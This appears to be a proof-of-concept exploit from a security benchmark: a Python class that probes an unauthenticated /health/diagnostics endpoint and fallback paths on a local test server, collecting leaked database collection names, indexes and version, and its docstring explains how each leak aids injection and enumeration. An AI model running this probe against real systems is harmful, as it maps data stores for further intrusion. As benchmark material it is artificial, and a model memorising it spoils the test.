"""PoC exploit: DB schema leak via health diagnostics endpoint (CWE-200).

After the 3-stage chain, GET /health/diagnostics?verbose=true returns
detailed database schema information without authentication:

1. Collection names (users, posts, sessions, etc.)
2. Index specifications (which fields are indexed, unique constraints)
3. Document counts per collection
4. Database server version

This information enables targeted attacks:
- Collection names reveal the data model (e.g., "admin_users" vs "users")
- Indexed fields hint at query patterns (useful for injection)
- Unique indexes reveal candidate fields for enumeration
- DB version exposes known CVEs for that version
- Document counts reveal scale/usage patterns

The endpoint is unauthenticated because it extends the /health check
which was designed for load balancer probes.
"""

from benchmark.chains.poc_templates import PublicInfoLeakTemplate


class IndexInfoLeakExploit(PublicInfoLeakTemplate):
    """Info leak: unauthenticated diagnostics endpoint exposes DB schema."""

    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "go_index_info_leak"

    def setup(self) -> None:
        """No setup needed — the endpoint is unauthenticated."""
        pass

    def execute(self) -> tuple[bool, str]:
        """Check if /health/diagnostics?verbose=true leaks DB schema info."""
        evidence_parts = []
        vuln_found = False

        # Test 1: Hit the diagnostics endpoint with verbose flag
        resp = self.http_get("/health/diagnostics?verbose=true")

        if resp.ok:
            body = resp.text.lower()
            data = {}
            try:
                data = resp.json()
            except Exception:
                pass

            # Check for collection names
            if "collections" in body or "collection" in body:
                evidence_parts.append(
                    "Response contains collection information."
                )
                vuln_found = True

            # Check for index information
            if "indexes" in body or "index" in body:
                evidence_parts.append(
                    "Response contains index specifications."
                )
                vuln_found = True

            # Check for database version
            if "version" in body:
                evidence_parts.append(
                    "Response exposes database version."
                )
                vuln_found = True

            # Check for specific schema indicators
            schema_indicators = [
                "users", "posts", "sessions", "accounts", "tokens",
                "document_count", "documentcount", "doc_count",
                "unique", "keys", "field",
            ]
            found_indicators = [ind for ind in schema_indicators if ind in body]
            if found_indicators:
                evidence_parts.append(
                    f"Schema-sensitive terms found in response: {found_indicators}."
                )
                if not vuln_found:
                    vuln_found = True

            # Extract structured data for detailed evidence
            db_info = data.get("database", {})
            if db_info:
                if "version" in db_info:
                    evidence_parts.append(
                        f"DB version exposed: {db_info['version']}."
                    )
                collections = db_info.get("collections", [])
                if collections:
                    names = [c.get("name", "?") for c in collections if isinstance(c, dict)]
                    evidence_parts.append(
                        f"Collections exposed: {names}."
                    )
                    for coll in collections:
                        if isinstance(coll, dict):
                            indexes = coll.get("indexes", [])
                            if indexes:
                                idx_names = [
                                    idx.get("name", "?") for idx in indexes
                                    if isinstance(idx, dict)
                                ]
                                evidence_parts.append(
                                    f"Indexes on '{coll.get('name', '?')}': {idx_names}."
                                )

        elif resp.status_code == 404:
            # Try alternative paths
            alternatives = [
                "/health?verbose=true",
                "/health/debug",
                "/diagnostics",
                "/health/indexes",
                "/_health/diagnostics?verbose=true",
            ]
            for alt_path in alternatives:
                alt_resp = self.http_get(alt_path)
                if alt_resp.ok:
                    alt_body = alt_resp.text.lower()
                    if any(term in alt_body for term in ["collection", "index", "version"]):
                        evidence_parts.append(
                            f"Diagnostics found at alternative path: {alt_path}."
                        )
                        vuln_found = True
                        break

        # Test 2: Verify no authentication is required
        if vuln_found:
            # Confirm by checking that no auth header was needed
            evidence_parts.append(
                "Endpoint is unauthenticated — no Authorization header sent."
            )

        # Test 3: Check if the base /health also leaks info
        resp_health = self.http_get("/health")
        if resp_health.ok:
            health_data = {}
            try:
                health_data = resp_health.json()
            except Exception:
                pass

            deps = health_data.get("dependencies", {})
            if deps:
                db_dep = deps.get("database", {})
                if "error" in str(db_dep).lower() or "version" in str(db_dep).lower():
                    evidence_parts.append(
                        f"Base /health also leaks dependency details: {deps}."
                    )

        if vuln_found:
            return True, (
                f"DB schema information leak confirmed (CWE-200). "
                f"GET /health/diagnostics?verbose=true exposes internal "
                f"database schema without authentication. "
                + " ".join(evidence_parts)
            )

        return False, (
            "No schema information leak detected. The diagnostics endpoint "
            "either doesn't exist, requires authentication, or doesn't "
            "expose sensitive database schema information."
        )
